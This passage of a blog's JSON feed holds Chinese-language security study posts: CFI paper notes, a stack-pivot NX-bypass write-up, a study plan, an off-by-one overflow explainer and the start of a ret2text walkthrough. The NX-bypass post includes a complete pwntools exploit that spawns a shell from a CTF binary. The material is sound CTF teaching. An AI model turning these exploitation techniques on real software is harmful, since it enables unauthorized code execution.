            "content_html": "<h2 id=\"Finding-Cracks-in-Shields-On-the-Security-of-Control-Flow-Integrity-Mechanisms\"><a href=\"#Finding-Cracks-in-Shields-On-the-Security-of-Control-Flow-Integrity-Mechanisms\" class=\"headerlink\" title=\"Finding Cracks in Shields:On the Security of Control Flow Integrity Mechanisms\"></a>Finding Cracks in Shields:On the Security of Control Flow Integrity Mechanisms</h2><hr>\n<p><img data-src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202305042048279.png\" alt=\"image-20230502185448539\"></p>\n<p>​\t最早的CFI机制在2005年被提出，后续又出现了各种各样的CFI，但是有一点就是这些机制都不能给予程序绝对的控制流安全性。通常的做法是给ICT（indirect control transfer）指令施加监视器，一个ICT可能存在多个合法的跳转目标，但是在每次执行的时候只能跳转到一个确定的位置。（因此最理想的情况就是每条跳转指令只能有一个确定的跳转位置）</p>\n<p>​\t当前的任何CFI控制流安全策略都需要解决以下几个问题：</p>\n<ul>\n<li>如何让claimed boundary和real boundary match？</li>\n<li>有些可行的目标组合依然会导致漏洞利用（这不就是DOP么？）</li>\n</ul>\n<p>然后这个文章后面讲了评估CFI方案好坏的方法，等用到的时候再看</p>\n",
            "tags": []
        },
        {
            "id": "https://alazymechnaic.github.io/2023/05/02/bypass-nx/",
            "url": "https://alazymechnaic.github.io/2023/05/02/bypass-nx/",
            "title": "bypass-NX",
            "date_published": "2023-05-02T06:56:58.000Z",
            "content_html": "<h2 id=\"Bypass-NX（DEP）\"><a href=\"#Bypass-NX（DEP）\" class=\"headerlink\" title=\"Bypass NX（DEP）\"></a>Bypass NX（DEP）</h2><h3 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h3><p>​\t栈不可执行（NX），其实也称为DEP(Data Execution PreventionData Execution Prevention),用于防止在栈上执行代码，当该保护开启时，会触发程序的<strong>SIGSEGV</strong> 错误。这里需要注意的一点为，开启该选项后，不只是栈段，数据段（堆段）依然处于不可执行的状态。</p>\n<h3 id=\"绕过\"><a href=\"#绕过\" class=\"headerlink\" title=\"绕过\"></a>绕过</h3><p>​\t既然无法将shellcode注入到数据段上并执行，那就只能修改IP指向已有的代码部分。例如采用技术 Return-to-libc,修改当前的EIP指针向已有的库函数，并且传递相应的参数。（<strong>如果在开启了NX的情况下如何进行单字节溢出的利用</strong>）。</p>\n<p><strong>least privilege &amp; seteuid(getuid())</strong></p>\n<p>​\t在实际的应用程序中会采用最小特权原则，并且能够进行权限继承，因此，攻击者能够获取与当前程序相同权限的shell，但在程序中可以通过setuid的方式主动放弃不必要的权限。因此，如果想要获得更高权限的shell需要构造以下调用序列：</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token function\">seteuid</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">system</span><span class=\"token punctuation\">(</span>“sh”<span class=\"token punctuation\">)</span>\n<span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>但是存在问题，setuid的参数是\\x00，但是strcpy在遇到\\x00后会自动停止，并不能将其拷贝到栈中。因此需要使用到两个技术：</p>\n<ul>\n<li>ESP lifting (ESP抬升)</li>\n<li>Frame Faking(栈帧伪造)</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zcGxvaXRmdW4ud29yZHByZXNzLmNvbS8yMDE1LzA1LzA4L2J5cGFzc2luZy1ueC1iaXQtdXNpbmctY2hhaW5lZC1yZXR1cm4tdG8tbGliYy8=\">https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-chained-return-to-libc/</span></li>\n</ul>\n<p>其实二者是一个东西，本质是和之前的单字节溢出，利用leave | ret指令实现栈抬升相同，主要使用leave和ret两个指令：</p>\n<pre class=\"line-numbers language-assembly\" data-language=\"assembly\"><code class=\"language-assembly\">leave:\n        move esp,ebp ; 恢复栈顶指针\n        pop ebp ;(esp=esp+4)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>栈迁移的本质是重新构造出进入jmp system_got 时的栈情况，最终目的是将esp迁移过来。但是需要注意的一点是，一次leave ret指令智能将esp抬升上去，并不能对ebp做任何操作，因此需要进行两次leave ret指令，第一个ret不能返回到system而是找到gadget：</p>\n<pre class=\"line-numbers language-assembly\" data-language=\"assembly\"><code class=\"language-assembly\">esp,ebp --&gt; old_ebp\n        --&gt; ret_addr\n        --&gt; arg1 :此处是指向system字符串参数的指针\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<hr>\n<h3 id=\"例题-ciscn-2019-s-4\"><a href=\"#例题-ciscn-2019-s-4\" class=\"headerlink\" title=\"例题 ciscn_2019_s_4\"></a>例题 ciscn_2019_s_4</h3><p><img data-src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202305042048537.png\" alt=\"image-20230504193243253\"></p>\n<p>题目很简单，buff的长度有40，但是read函数长度有48，多出八个字节能够溢出。总体思路是进行rop，但是由于溢出长度有限，在vul函数退出后进行了清理堆栈的操作，导致后面的内容不可控，因此需要进行栈迁移，将更多的栈部分可控。</p>\n<p><img data-src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202305042048754.png\" alt=\"image-20230504193612815\"></p>\n<p>在32位程序下，栈按照四个字节进行对齐，因此溢出的八个字节能够覆盖ebp指针和ret地址。一个函数在执行leave | ret之前的状态如下：</p>\n<pre class=\"line-numbers language-assembly\" data-language=\"assembly\"><code class=\"language-assembly\">esp -&gt; [???] ; 此时的esp指针可能会指向栈中的任意位置\n...\nebp -&gt; [old_ebp] ; 这里是记录父函数的栈基址，由刚进子函数的时候push ebp指令存储至此\n\t   [ret_add] ; 记录当前的返回地址<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>上述经过栈溢出后，old_ebp和ret_addr被覆盖为new_ebp, new_ret_addr,在执行leave ret指令后的栈空间：</p>\n<pre class=\"line-numbers language-assembly\" data-language=\"assembly\"><code class=\"language-assembly\">inst: \n\tmov esp,ebp\n----------------------------------------------\nebp,esp -&gt; [new_ebp] ; 这里是记录父函数的栈基址，由刚进子函数的时候push ebp指令存储至此\n\t   [new_ret_addr] ; 记录当前的返回地址\n----------------------------------------------\ninst: \n\tpop ebp\n----------------------------------------------\nebp = buff_(new_ebp) ; 指向新的栈位置,这里位置的构造进行后续讨论\nesp -&gt; [new_ret_addr] ; 记录当前的返回地址<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>但是注意此时还并没有完全将栈迁移出去。此时的esp还在低位，如果直接将new_ret_addr覆盖为system，则此时索引的arg参数是esp + 0x4（因为在执行过call函数后，压入了call system的下一个地址），比esp地址更高的位置显然是不可控的（注意这里，栈是向低地址增长的，新函数的参数由父函数压入，因此在高地址）。需要将esp进行同样的抬升。因此需要再次执行leave ret指令继续修改。</p>\n<pre class=\"line-numbers language-assembly\" data-language=\"assembly\"><code class=\"language-assembly\">inst: \n\tmov esp,ebp\n----------------------------------------------\nebp,esp = buff_ ; 执行结束后完成将esp的抬升\n----------------------------------------------\ninst: \n\tpop ebp\n----------------------------------------------\nesp = buff_ ;  \nebp = Any ;   pop ebp执行后会改变ebp，但是对后续的利用来说，ebp指向哪里并没有影响,因为子函数只基于esp进行索引<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>所以该题目的思路也逐渐清晰，就是要通过溢出将esp抬升。抬升前需要指导buff的地址，也就是esp应该抬升到哪里去，本题还需要用到的部分是<strong>printf</strong>本身在输出的时候接收一个字符串指针，并自动执行到\\x00的位置结束。因此可以利用该机制进行ebp的泄露。</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\nsh <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./ciscn_s_4'</span><span class=\"token punctuation\">)</span>\nelf<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./ciscn_s_4'</span><span class=\"token punctuation\">)</span>\ncontext<span class=\"token punctuation\">(</span>os <span class=\"token operator\">=</span> <span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>arch <span class=\"token operator\">=</span> <span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span>\n<span class=\"token triple-quoted-string string\">'''\n\t静态查找leave ret指令地址\n'''</span>\nsystem_addr <span class=\"token operator\">=</span> <span class=\"token number\">0x8048400</span>\nleave_ret_addr<span class=\"token operator\">=</span><span class=\"token number\">0x080484B8</span>\nret_addr <span class=\"token operator\">=</span> p32<span class=\"token punctuation\">(</span>system_addr<span class=\"token punctuation\">)</span>\n<span class=\"token triple-quoted-string string\">'''\n\t第一次直接构造和buff长度相同的输入，printf时会输出后续内容\n'''</span>\npayload <span class=\"token operator\">=</span><span class=\"token string\">b'a'</span> <span class=\"token operator\">*</span> <span class=\"token number\">0x28</span>\nsh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'name?\\n'</span><span class=\"token punctuation\">)</span>\nsh<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\n<span class=\"token triple-quoted-string string\">'''\n\t接收泄露的ebp输出\n'''</span>\nsh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x28</span><span class=\"token punctuation\">)</span>\nebp <span class=\"token operator\">=</span> u32<span class=\"token punctuation\">(</span>sh<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token triple-quoted-string string\">'''\n\t这里泄露出ebp后只能做基于ebp的偏移，将ebp偏移到buff的位置。当程序的控制流的确定时，其栈帧的相对位置也是确定的，因此可以直接在动态调试的过程中获取ebp和buff的位置，直接相减得到偏移量为0x38\n'''</span>\nfake_ebp <span class=\"token operator\">=</span> ebp <span class=\"token operator\">-</span><span class=\"token number\">0x38</span>\n<span class=\"token triple-quoted-string string\">'''\n\t构造第二次输入的payload\n'''</span>\npayload<span class=\"token operator\">=</span>p32<span class=\"token punctuation\">(</span>system_addr<span class=\"token punctuation\">)</span> <span class=\"token comment\"># ret addr</span>\npayload<span class=\"token operator\">+=</span><span class=\"token string\">b'aaaa'</span> <span class=\"token comment\"># junk ret addr 用于模拟call system时的压入返回值操作</span>\npayload<span class=\"token operator\">+=</span>p32<span class=\"token punctuation\">(</span>fake_ebp<span class=\"token operator\">+</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 指向system参数的指针，这里注意，system传入的不是一个字符串而是一个指针</span>\npayload<span class=\"token operator\">+=</span><span class=\"token string\">b'/bin/sh\\x00'</span> <span class=\"token comment\"># payload</span>\npayload<span class=\"token operator\">=</span>payload<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x28</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'A'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 这里对当前的栈进行补齐操作</span>\npayload<span class=\"token operator\">+=</span>p32<span class=\"token punctuation\">(</span>fake_ebp<span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 该位置会作为新的栈顶更高的位置，在执行第二次leave ret指令时会进行一次pop ebp</span>\npayload<span class=\"token operator\">+=</span>p32<span class=\"token punctuation\">(</span>leave_ret_addr<span class=\"token punctuation\">)</span> <span class=\"token comment\"># 填入leave ret返回值</span>\nsh<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nsh<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nexit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>注意两个关键位置：</p>\n<p><strong>payload+=p32(fake_ebp+12) # 指向system参数的指针，这里注意，system传入的不是一个字符串而是一个指针</strong></p>\n<p><strong>payload+=p32(fake_ebp-4) # 该位置会作为新的栈顶更高的位置，在执行第二次leave ret指令时会进行一次pop ebp</strong></p>\n<h3 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h3><p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NlYV90aW1lL2FydGljbGUvZGV0YWlscy8xMDYxNDI5NzE=\">https://blog.csdn.net/sea_time/article/details/106142971</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zcGxvaXRmdW4ud29yZHByZXNzLmNvbS8yMDE1LzA1LzA4L2J5cGFzc2luZy1ueC1iaXQtdXNpbmctY2hhaW5lZC1yZXR1cm4tdG8tbGliYy8=\">https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-chained-return-to-libc/</span></p>\n",
            "tags": [
                "bypass"
            ]
        },
        {
            "id": "https://alazymechnaic.github.io/2023/05/02/personal-plan/",
            "url": "https://alazymechnaic.github.io/2023/05/02/personal-plan/",
            "title": "personal_plan",
            "date_published": "2023-05-02T06:30:16.000Z",
            "content_html": "<h1 id=\"技术路线\"><a href=\"#技术路线\" class=\"headerlink\" title=\"技术路线\"></a>技术路线</h1><p>​\t本文用于对当前的栈中的内容和未学习内容进行索引。<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0NIWWJldGEvU29mdHdhcmUtU2VjdXJpdHktTGVhcm5pbmc=\">https://github.com/CHYbeta/Software-Security-Learning</span></p>\n<h2 id=\"二进制安全\"><a href=\"#二进制安全\" class=\"headerlink\" title=\"二进制安全\"></a>二进制安全</h2><h3 id=\"Windows\"><a href=\"#Windows\" class=\"headerlink\" title=\"Windows\"></a>Windows</h3><ul>\n<li><strong>SEH机制</strong></li>\n<li></li>\n</ul>\n<h4 id=\"Linux\"><a href=\"#Linux\" class=\"headerlink\" title=\"Linux\"></a>Linux</h4><ul>\n<li>One byte overflow</li>\n</ul>\n<h2 id=\"安卓安全\"><a href=\"#安卓安全\" class=\"headerlink\" title=\"安卓安全\"></a>安卓安全</h2><h2 id=\"渗透实战\"><a href=\"#渗透实战\" class=\"headerlink\" title=\"渗透实战\"></a>渗透实战</h2><h3 id=\"后渗透\"><a href=\"#后渗透\" class=\"headerlink\" title=\"后渗透\"></a>后渗透</h3><ul>\n<li></li>\n</ul>\n<h2 id=\"CTF-WP\"><a href=\"#CTF-WP\" class=\"headerlink\" title=\"CTF WP\"></a>CTF WP</h2>",
            "tags": [
                "personal"
            ]
        },
        {
            "id": "https://alazymechnaic.github.io/2023/04/27/one-byte-overflow/",
            "url": "https://alazymechnaic.github.io/2023/04/27/one-byte-overflow/",
            "title": "one_byte_overflow",
            "date_published": "2023-04-27T11:40:42.000Z",
            "content_html": "<h2 id=\"off-By-One-缓冲区溢出\"><a href=\"#off-By-One-缓冲区溢出\" class=\"headerlink\" title=\"off-By-One 缓冲区溢出\"></a>off-By-One 缓冲区溢出</h2><h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>​\t本文用于填补先前对于二进制漏洞一些理解上的不足，学习off-by-one的漏洞利用方式。<strong>缓冲区溢出的终极目的在于获取目标机器的权限，但是获取权限未必只要一种方式，你可以添加用户，反弹shell、开启一个新的网络链接等</strong>。主要参考：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zcGxvaXRmdW4ud29yZHByZXNzLmNvbS8yMDE1LzA2LzA3L29mZi1ieS1vbmUtdnVsbmVyYWJpbGl0eS1zdGFjay1iYXNlZC0yLw==\">https://sploitfun.wordpress.com/2015/06/07/off-by-one-vulnerability-stack-based-2/</span></p>\n<h3 id=\"单字节溢出案例\"><a href=\"#单字节溢出案例\" class=\"headerlink\" title=\"单字节溢出案例\"></a>单字节溢出案例</h3><pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h&gt;</span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h&gt;</span></span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">foo</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token operator\">*</span> arg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">bar</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token operator\">*</span> arg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">foo</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token operator\">*</span> arg<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n <span class=\"token function\">bar</span><span class=\"token punctuation\">(</span>arg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* [1] */</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">bar</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token operator\">*</span> arg<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n <span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">256</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n <span class=\"token function\">strcpy</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">,</span> arg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* [2] */</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>argv<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&gt;</span><span class=\"token number\">256</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <span class=\"token comment\">/* [3] */</span>\n  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Attempted Buffer Overflow\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">fflush</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdout</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">return</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n <span class=\"token punctuation\">}</span>\n <span class=\"token function\">foo</span><span class=\"token punctuation\">(</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* [4] */</span>\n <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>​\t<strong>当目标缓冲区大小与写入长度相一致时，会出现单字节溢出</strong>，因为在strcpy的处理过程中，将传入的参数都视为视为是字符串，默认会在复制过后在末尾添加一个字节的0x00，因此会向buffer的第256个位置处写0x00。\t</p>\n<p>​\t该操作会向下一个位置中写入0x00，下一个位置有可能就是ebp的存储位置，其实也就是栈区基地址。但是只能更改一个字节，其实也就是ebp指针的最低字节，当前过程在退出的过程中，执行leave指令，会将被修改后的ebp写入到寄存器中。</p>\n<p>​\t<strong>栈基址</strong>的高位迁移。由于只能向ebp的低字节中写入一个0，也就是稳定会将ebp抬高，从而更改栈的位置。当前ebp的较高位置其实就是用于存放当前函数临时变量的位置，其实也就控制了栈。在上述例子中，在foo函数中完成了栈的抬升，将栈设置到可控区域中。在main函数退出时就会取出错误的返回地址return，进行间接的控制流劫持操作。</p>\n<h3 id=\"栈迁移不可用的情况\"><a href=\"#栈迁移不可用的情况\" class=\"headerlink\" title=\"栈迁移不可用的情况\"></a>栈迁移不可用的情况</h3><ul>\n<li><p><strong>单字节溢出无法影响ebp</strong>：如果本身当前的缓冲区在ebp之上，但是并不能</p>\n</li>\n<li><p><strong>栈基地址的低位本身就是0x00</strong>：</p>\n</li>\n<li><p><strong>程序本身存在16字节对齐的情况</strong>：其实默认情况下gcc编译器都会对程序进行16字节的对齐，因此在创建堆栈空间之前会将esp的最后四个位进行清零操作。（因为最后四位正好是表示16个字节</p>\n<pre class=\"line-numbers language-assembly\" data-language=\"assembly\"><code class=\"language-assembly\">0x08048497 &lt;+0&gt;: push %ebp\n0x08048498 &lt;+1&gt;: mov %esp,%ebp\n0x0804849a &lt;+3&gt;: push %edi\n0x0804849b &lt;+4&gt;: and $0xfffffff0,%esp               //Stack space aligned to 16 byte boundary\n0x0804849e &lt;+7&gt;: sub $0x20,%esp   <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>\n</ul>\n<p>关于栈迁移请参考该位置<a href=\"https://alazymechnaic.github.io/2023/05/02/bypass-nx/\">https://alazymechnaic.github.io/2023/05/02/bypass-nx/</a></p>\n",
            "tags": [
                "binary"
            ]
        },
        {
            "id": "https://alazymechnaic.github.io/2023/04/26/stack-based-overflow/",
            "url": "https://alazymechnaic.github.io/2023/04/26/stack-based-overflow/",
            "title": "Stack_based_overflow",
            "date_published": "2023-04-26T03:17:43.000Z",
            "content_html": "<p>随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在<strong>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong>所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p>\n<p>之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件</p>\n<ul>\n<li>程序存在溢出，并且可以控制返回地址。</li>\n<li>可以找到满足条件的 gadgets 以及相应 gadgets 的地址。</li>\n</ul>\n<p>如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。</p>\n<h2 id=\"ret2text¶\"><a href=\"#ret2text¶\" class=\"headerlink\" title=\"ret2text¶\"></a>ret2text<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvI3JldDJ0ZXh0\">¶</span></h2><h3 id=\"原理-¶\"><a href=\"#原理-¶\" class=\"headerlink\" title=\"原理 ¶\"></a>原理 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvI18x\">¶</span></h3><p>ret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。</p>\n<p>这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。</p>\n<h3 id=\"例子-¶\"><a href=\"#例子-¶\" class=\"headerlink\" title=\"例子 ¶\"></a>例子 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvI18y\">¶</span></h3><p>其实，在栈溢出的基本原理中，我们已经介绍了这一简单的攻击。在这里，我们再给出另外一个例子，bamboofox 中介绍 ROP 时使用的 ret2text 的例子。</p>\n<p>点击下载: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2N0Zi13aWtpL2N0Zi1jaGFsbGVuZ2VzL3Jhdy9tYXN0ZXIvcHduL3N0YWNrb3ZlcmZsb3cvcmV0MnRleHQvYmFtYm9vZm94LXJldDJ0ZXh0L3JldDJ0ZXh0\">ret2text</span></p>\n<p>首先，查看一下程序的保护机制</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">➜  ret2text checksec ret2text\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x8048000)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>可以看出程序是 32 位程序，其仅仅开启了栈不可执行保护。然后，我们使用 IDA 来查看源代码。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">int __cdecl main(int argc, const char **argv, const char **envp)\n{\n  int v4; // [sp+1Ch] [bp-64h]@1\n\n  setvbuf(stdout, 0, 2, 0);\n  setvbuf(_bss_start, 0, 1, 0);\n  puts(\"There is something amazing here, do you know anything?\");\n  gets((char *)&amp;v4);\n  printf(\"Maybe I will tell you next time !\");\n  return 0;\n}<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>可以看出程序在主函数中使用了 gets 函数，显然存在栈溢出漏洞。此后又发现</p>\n<pre class=\"line-numbers language-assembly\" data-language=\"assembly\"><code class=\"language-assembly\">.text:080485FD secure          proc near\n.text:080485FD\n.text:080485FD input           = dword ptr -10h\n.text:080485FD secretcode      = dword ptr -0Ch\n.text:080485FD\n.text:080485FD                 push    ebp\n.text:080485FE                 mov     ebp, esp\n.text:08048600                 sub     esp, 28h\n.text:08048603                 mov     dword ptr [esp], 0 ; timer\n.text:0804860A                 call    _time\n.text:0804860F                 mov     [esp], eax      ; seed\n.text:08048612                 call    _srand\n.text:08048617                 call    _rand\n.text:0804861C                 mov     [ebp+secretcode], eax\n.text:0804861F                 lea     eax, [ebp+input]\n.text:08048622                 mov     [esp+4], eax\n.text:08048626                 mov     dword ptr [esp], offset unk_8048760\n.text:0804862D                 call    ___isoc99_scanf\n.text:08048632                 mov     eax, [ebp+input]\n.text:08048635                 cmp     eax, [ebp+secretcode]\n.text:08048638                 jnz     short locret_8048646\n.text:0804863A                 mov     dword ptr [esp], offset command ; \"/bin/sh\"\n.text:08048641                 call    _system<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>在 secure 函数又发现了存在调用 system(“/bin/sh”) 的代码，那么如果我们直接控制程序返回至 0x0804863A，那么就可以得到系统的 shell 了。</p>\n<p>下面就是我们如何构造 payload 了，首先需要确定的是我们能够控制的内存的起始地址距离 main 函数的返回地址的字节数。</p>\n<pre class=\"line-numbers language-assembly\" data-language=\"assembly\"><code class=\"language-assembly\">.text:080486A7                 lea     eax, [esp+1Ch]\n.text:080486AB                 mov     [esp], eax      ; s\n.text:080486AE                 call    _gets<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>可以看到该字符串是通过相对于 esp 的索引，所以我们需要进行调试，将断点下在 call 处，查看 esp，ebp，如下</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">gef➤  b *0x080486AE\nBreakpoint 1 at 0x80486ae: file ret2text.c, line 24.\ngef➤  r\nThere is something amazing here, do you know anything?\n\nBreakpoint 1, 0x080486ae in main () at ret2text.c:24\n24      